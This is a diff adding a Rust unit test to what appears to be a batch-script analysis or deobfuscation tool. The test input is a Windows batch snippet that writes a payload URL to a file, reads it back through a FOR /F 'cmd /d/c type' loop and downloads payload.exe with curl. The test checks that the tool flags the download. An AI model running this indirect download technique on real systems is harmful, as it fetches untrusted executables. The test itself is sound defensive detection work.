@@ -3767,6 +3767,28 @@ for /f "tokens=* delims=" %%U in ('cmd /c type url.txt') do curl -o payload.exe 
     }
 
     #[test]
+    fn for_f_cmd_combined_switch_type_reads_generated_file_source() {
+        let report = analyze(
+            br#"echo https://for-f-cmd-combined-switch.example/payload.exe>url.txt
+for /f "tokens=* delims=" %%U in ('cmd /d/c type url.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-cmd-combined-switch.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F cmd /d/c type source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_type_reads_multiple_generated_file_sources() {
         let report = analyze(
             br#"echo noise>first.txt
